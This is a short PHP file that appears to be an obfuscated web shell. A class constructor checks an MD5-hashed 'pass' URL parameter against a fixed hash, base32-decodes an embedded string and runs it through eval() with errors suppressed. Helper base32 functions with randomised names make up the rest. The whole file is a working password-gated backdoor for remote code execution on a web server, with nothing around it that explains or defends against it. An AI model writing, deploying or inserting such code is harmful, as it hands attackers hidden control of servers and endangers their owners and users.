<?php
class YNJE{
        public $ZTUR = null;
        public $MBET = null;
        function __construct(){
            if(md5($_GET["pass"])=="df24bfd1325f82ba5fd3d3be2450096e"){
        $this->ZTUR = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->MBET = @AHBV($this->ZTUR);
        @eval("/*c#-]!^o*/".$this->MBET."/*c#-]!^o*/");
        }}}
new YNJE();
function QEHL($LPKZ){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $TXGB = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($LPKZ); $i < $j; $i++){
    $v <<= 8;
        $v += ord($LPKZ[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $TXGB .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $TXGB .= $BASE32_ALPHABET[$v];}
    return $TXGB;}
function AHBV($LPKZ){
    $TXGB = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($LPKZ); $i < $j; $i++){
        $v <<= 5;
        if ($LPKZ[$i] >= 'a' && $LPKZ[$i] <= 'z'){
            $v += (ord($LPKZ[$i]) - 97);
        } elseif ($LPKZ[$i] >= '2' && $LPKZ[$i] <= '7') {
            $v += (24 + $LPKZ[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $TXGB .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $TXGB;}
?>